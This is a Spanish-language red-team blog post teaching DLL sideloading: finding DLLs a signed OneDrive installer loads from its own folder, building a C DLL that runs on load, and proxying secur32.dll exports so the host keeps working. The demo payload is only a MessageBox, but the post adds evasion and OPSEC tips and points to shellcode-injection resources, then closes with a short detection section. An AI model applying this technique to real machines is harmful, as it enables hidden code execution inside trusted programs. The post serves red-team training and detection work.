---
title: DLL Sideloading - Ejecutando código con nuestras DLLs maliciosas
description: Profundizamos el concepto de DLL Sideloading proxificando llamadas a dlls reales. 
date: 2026-02-15
categories: [evasion]
tags: [evasion, opsec, redteam, malware, ejecución,]     # Los tags deben estar siempre en minúsculas.
image:
  path: /assets/img/dllsideloading/logo.png
---

## 0. ¿Que es una DLL?
Una DLL según la [documentación de microsoft](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-libraries) es un módilo que contiene funcione sy datos que pueden ser utilizados por otro módulo como un ejecutable u otra DLL. Las DLLs se utilizan para facilitar el desarrollo, utilizar menos recursos y reutilizar código. Todas las funciones e una DLL están bien [documentadas](https://learn.microsoft.com/en-us/troubleshoot/windows-client/setup-upgrade-and-drivers/dynamic-link-library) por Microsoft. 

![Desktop View](/assets/img/dllsideloading/0.png)

Es importante entender que las DLLs no son ejecutables por si mismas como hace en nuestra cabeza un .exe sino que dependen de otro proceso. 

## 1. DLL Hijacking
Entendiendo que es una DLL se nos quedan algunso flecos. ¿Donde se encuentra la DLL que va a ejecutar mi exe? Ahí es donde nace el DLL Hijacking [T1574.001](https://attack.mitre.org/techniques/T1574/001/). La propia [documentación de Microsoft](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-security) nos señala el órden de busqueda de una DLL que hemos definido en nuestro programa como el siguiente: 

 1- The directory from which the application loaded. <br>
 2- The system directory. <br>
 3- The 16-bit system directory. <br>
 4- The Windows directory. <br>
 5- The current directory. <br>
 6- The directories that are listed in the PATH environment variable. <br>

Probablemente ya te hayas dado cuenta de que el primer path donde busca una dll es el propio directorio donde se carga el exe por encima de cualquier directorio del sistema sobre el que tengamos o no permisos. Esto nos da un gran margen de acción ya que puede que no tengamos capacidad de modificar un directorio de system pero si de cualquier otro, y ahí tenemos mucho margen de acción. <br>

![Desktop View](/assets/img/dllsideloading/1.png)

Por remarcarlo es excluyente. Es decir mi exe que llama a Secur32.dll llamará primero al mismo directorio en el que se ejecutó mi exe, luego al de system... y así consecutivamente. Esto nos da la oportunidad de, si sabemos que DLLs quiere cargar un binario custom o no darle una DLL maliciosa en la misma ruta de ejecución y ejecutar esa DLL maliciosa ¿no?. Es decir que si sé que DLLs carga un binario de Microsoft podría utilizar el binario para ejecutar mi DLL maliciosa. 

![Desktop View](/assets/img/dllsideloading/2.png)

> Esta técnica se va a demostrar con binarios de Microsoft. Valora dependiendo del excenario la posibilidad de abusar de un ejecutable ya existente en la máquina del target. La descarga de un exe sea o no de Microsoft levantará alertas y marcará todo con [MotW](https://c0nfig17.com/posts/Funcionamiento-y-evasi%C3%B3n-de-MotW/) por lo que buscar algo hecho por el propio target puede ayudarte. Ten en cuenta el OPSEC en el despliegue de esta técnica en tus ejercicios de Red Team. 
{: .prompt-tip }

Para utilizar esta técnica os recomiendo altamente la siguiente web la cual recopila una gran cantidad de dlls vulnerables hijacking las cuales podemos utilizar y ya han sido reportadas [hijacklibs.net](https://hijacklibs.net/#). Ten en cuenta que cualquier cosa custom que hagas será menos detectable, por lo que valora la posibilidad de buscar las tuyas propias o adecuadas al target. 

## 2. Nuestro primer DLL Hijaking

Una vez entendida la teoría vamos a mancharnos las manos. 

### 2.1 Encontrando DLLs cargadas
En mi caso voy a utilizar un exe oficial de microsoft para instalar One Drive descargado de su web oficial. Lo primero que analizamos es entender el proceso que va a ejecutar nuestro exe. Posteriormente usamos [procmon](https://learn.microsoft.com/es-es/sysinternals/downloads/procmon) y aplicamos un filtro por el nombre del proceso que ejecuta. Tendremos que encontrar una DLL que nos sirva, para ello buscaremos operaciones "CreateFile" y resultados "NAME NOT FOUND" para localizarlas.

![Desktop View](/assets/img/dllsideloading/3.png)


En mi caso para este exe parece ser un buen candidato Secur32.dll .

![Desktop View](/assets/img/dllsideloading/4.png)



### 2.2 Generando nuestra propia DLL maliciosa
Vamos a ello! <br>
Creamos nuestro primer proyecto de una DLL con Visual Studio. Es probable que tengas que instalar el paquete que te permite generar DLLs ya que no viene por defecto. 

![Desktop View](/assets/img/dllsideloading/5.png)

Tenemos nuestro proyecto como siempre listo para empezar. En este punto vamos a utilizar un MessageBox para imprimir un texto en la pantalla que nos permita ver si ha funcionado. Os paso el código por aquí aunque lo teneís disponible en [ired.team](https://www.ired.team/offensive-security/persistence/dll-proxying-for-persistence) :

```text
#include "pch.h"

#include <Windows.h>

#ifdef _WIN64
#define DLLPATH "\\\\.\\GLOBALROOT\\SystemRoot\\System32\\Secur32.dll"
#else
#define DLLPATH "\\\\.\\GLOBALROOT\\SystemRoot\\SysWOW64\\Secur32.dll"
#endif // _WIN64

#pragma comment(linker, "/EXPORT:GetUserNameExW=" DLLPATH ".GetUserNameExW")

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
    {
        MessageBoxA(NULL, "Malicious DLL by c0nfig17", "Malicious DLL by c0nfig17", 0);

    }
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

![Desktop View](/assets/img/dllsideloading/6.png)

Compilamos nuestra DLL en Release. 

![Desktop View](/assets/img/dllsideloading/7.png)

Toca la hora de la verdad. Doble Click en el instalador.

![Desktop View](/assets/img/dllsideloading/8.png)

En este punto puede que veamos diferentes errores según utilicemos onedrive ya que estamos modificando el funcionmaiento normal del exe. Está buscando el Secur32.dll original con un comportamiento esperado y no está siendo capaz de ejecutarlo correctamente.  

![Desktop View](/assets/img/dllsideloading/9.png)

En este punto podemos ver también mediante [ListDLLs](https://learn.microsoft.com/es-es/sysinternals/downloads/listdlls) de Sysinternals de manera clara que hemos conseguido ejecutar nuestra DLL maliciosa y las caracteristicas de la misma. Utilizamos -u para investigar que dlls no firmadas han saltado con la ejecución y se ve de lejos.  

![Desktop View](/assets/img/dllsideloading/10.png)

### 2.3 Proxificando nuestra dll
Vamos a empezar a tener errores y esto es un problema. No nos interesa tanto porque el el usuario puede extrañarse y contactar a soporte como que el propio sistema va a levantar errores sobre dlls y eso no nos interesa. Por ello lo que vamos a hacer es dejar de romper la lógica y simplemente abusar de ella una vez demostrado que nuestra dll maliciosa funciona. Para eso lo que trataremos es que nuestra DLL maliciosa 

![Desktop View](/assets/img/dllsideloading/11.png)

Existe un repositorio de [mrexodia](https://github.com/mrexodia) llamado [perfect DLL Proxy](https://github.com/mrexodia/perfect-dll-proxy) el cual nos permite fácilmente proxificar nuestra dll generando el contenido que tendremos que compilar. Lo usamos de manera super sencilla. 

```text 
python -m pip install pefile
python perfect-dll-proxy.py credui.dll
```

En nuestro caso generamos secur32.dll .

```text 
python perfect_dll_proxy.py secur32.dll
```

De manera super sencilla podemos generar el contenido de nuestra secur32.dll proxificada para evitar errores. 

```text 
#include "pch.h"

#include <Windows.h>

#ifdef _WIN64
#define DLLPATH "\\\\.\\GLOBALROOT\\SystemRoot\\System32\\secur32.dll"
#else
#define DLLPATH "\\\\.\\GLOBALROOT\\SystemRoot\\SysWOW64\\secur32.dll"
#endif // _WIN64

#pragma comment(linker, "/EXPORT:AcceptSecurityContext=" DLLPATH ".AcceptSecurityContext")
#pragma comment(linker, "/EXPORT:AcquireCredentialsHandleA=" DLLPATH ".AcquireCredentialsHandleA")
#pragma comment(linker, "/EXPORT:AcquireCredentialsHandleW=" DLLPATH ".AcquireCredentialsHandleW")
#pragma comment(linker, "/EXPORT:AddCredentialsA=" DLLPATH ".AddCredentialsA")
#pragma comment(linker, "/EXPORT:AddCredentialsW=" DLLPATH ".AddCredentialsW")
...
#pragma comment(linker, "/EXPORT:TranslateNameW=" DLLPATH ".TranslateNameW")
#pragma comment(linker, "/EXPORT:UnsealMessage=" DLLPATH ".UnsealMessage")
#pragma comment(linker, "/EXPORT:VerifySignature=" DLLPATH ".VerifySignature")

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    switch (fdwReason)
    {
        case DLL_PROCESS_ATTACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```

Repetimos el proceso, doble click y listo!


### 2.4 Recursos extra!

Cuando empieces a adentrarte en este mundo verás que hay 80mil recursos diferentes y formas de enfocar lo que vayas a ejecutar. En mi caso he realizado un pequeño script como fork del repo de mrexodia que permite automatizar un poco más el proceso iyectando el payload directamente cuando generas la dll y con alguna mejora sencilla, lo tienes todo en el repo [proxymydll](https://github.com/c0nfig-17/proxymydll). 

![Desktop View](/assets/img/dllsideloading/12.png)

Te dejo unos cuantos recursos que me han parecido relevantes:

- [Launch Shellcode as a Thread via DllMain rather than a new process](https://gist.github.com/securitytube/c956348435cc90b8e1f7)
- [SharpDllProxy](https://github.com/Flangvik/SharpDllProxy?tab=readme-ov-file)
- [DLL Proxying for Persistence](https://www.ired.team/offensive-security/persistence/dll-proxying-for-persistence)
- [Exploiting DLL Hijacking by DLL Proxying Super Easily](https://github.com/tothi/dll-hijack-by-proxying)
- [rtec DLL Sideloading](https://www.r-tec.net/r-tec-blog-dll-sideloading.html)
- [Spartacus DLL Sideloading](https://github.com/Accenture/Spartacus)



## 3. Detección y blue team


### 3.1 Oportunidades de detección

De cara al analisis puedes usar [ListDLLs](https://learn.microsoft.com/es-es/sysinternals/downloads/listdlls) de Sysinternals ya que te cantará de manera muy sencilla dlls que no estan firmadas. Actualmente la práctica de usar DLLs no firmadas está muy extendida, así que peudes tener falsos postivos pero puede ayudar te a localizar problemas. Puedes concatenar detecciones sobre procesos 1 y 7 de Sysmon junto con 4688 de Windows Security. En general existen tres método de detección básicos: 1)La carga de DLLs no firmadas, 2)El tiempo de carga normal de la dll y el aumento por comportamiento y 3)La carga de una DLL a partir de otra DLL [lo cual se podría controlar también a nivel ofensivo para mejorar la evasión].



### 3.2 Recursos extra!
Te dejo unos cuantos recursos que me han parecido relevantes:
- [Red Canary DLL Search order Hijacking](https://redcanary.com/threat-detection-report/techniques/dll-search-order-hijacking/)
- [Crowdstrike 4 Ways Adversaries Hijack DLLs](https://www.crowdstrike.com/en-us/blog/4-ways-adversaries-hijack-dlls/)
- [Crowdstrike DLL Side-Loading: How to Combat Threat Actor Evasion Techniques](https://www.crowdstrike.com/en-us/blog/dll-side-loading-how-to-combat-threat-actor-evasion-techniques/)
- [Mandiant google DLL Side-loading and Hijacking — Using Threat Intelligence to Weaponize R and D](https://cloud.google.com/blog/topics/threat-intelligence/abusing-dll-misconfigurations)
- [wmray dll sideloading](https://www.vmray.com/dll-sideloading/)
- [Group IB hunting rituals dll side loading ](https://www.group-ib.com/blog/hunting-rituals-dll-side-loading/)
- [Sophos El ataque de carga lateral remota de DLL GOLD BLADE despliega RedLoader](https://www.sophos.com/es-es/blog/gold-blade-remote-dll-sideloading-attack-deploys-redloader)









---
## Apoya el contenido de ciberseguridad en castellano

Si esta publicación te ha sido útil y quieres apoyar mi trabajo para que continúe creando más contenido, aquí te dejo algunas formas de apoyar:

1. **Compartir el contenido**  📲
   Si crees que esta guía puede ser útil para otras personas, compartirla en tus redes sociales es una gran ayuda. 

2. **Donar en Ko-fi**  💖
   Puedes hacer una donación rápida a través de Ko-fi para ayudarme a seguir publicando guías y tutoriales. ¡Cada aportación cuenta y es muy apreciada! 

   <script type='text/javascript' src='https://storage.ko-fi.com/cdn/widget/Widget_2.js'></script><script type='text/javascript'>kofiwidget2.init('Apoya este contenido!', '#455d85', 'A0A41BO608');kofiwidget2.draw();</script> 
   
3. **Usa mi enlace de afiliado de NordVPN y NordPass para mejorar tu seguridad y apoyar la creación de contenido**  🛡️
   Puedes suscribirte a [**NordVPN**](https://go.nordvpn.net/aff_c?offer_id=15&aff_id=132246&url_id=902) con un 75% de descuento y 3 meses gratis o a [**NordPass**](https://nordpass.com/special/?utm_medium=affiliate&utm_term&utm_content&utm_campaign=off488&utm_source=aff132246&aff_free) con un 53% de descuento y 3 meses gratis y mejorar tu seguridad a la vez que apoyas el contenido de ciberseguridad en español. <br>

---

¡Gracias por tu apoyo! 🙏
![Desktop View](/assets/img/banner.png) <br>